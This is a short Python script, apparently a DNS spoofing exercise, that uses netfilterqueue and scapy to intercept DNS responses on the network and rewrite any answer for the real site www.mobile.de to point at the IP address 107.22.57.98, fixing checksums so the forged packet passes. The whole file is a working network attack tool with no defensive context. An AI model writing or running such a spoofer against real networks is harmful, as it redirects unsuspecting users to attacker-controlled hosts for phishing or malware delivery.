#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy


def processed_packs(pack):
    scapy_pack = scapy.IP(pack.get_payload())
    scapy_pack.show()
    if scapy_pack.haslayer(scapy.DNSRR):
        qname = scapy_pack[scapy.DNSQR].qname
        if "www.mobile.de" in qname.decode():
            print("targer website found")
            answer = scapy.DNSRR(rrname=qname, rdata='107.22.57.98')
            scapy_pack[scapy.DNS].an = answer
            scapy_pack[scapy.DNS].ancount = 1
            del scapy_pack[scapy.IP].chksum
            del scapy_pack[scapy.IP].len
            del scapy_pack[scapy.UDP].chksum
            del scapy_pack[scapy.UDP].len
            pack.set_payload(bytes(scapy_pack))
    pack.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0,processed_packs)
queue.run()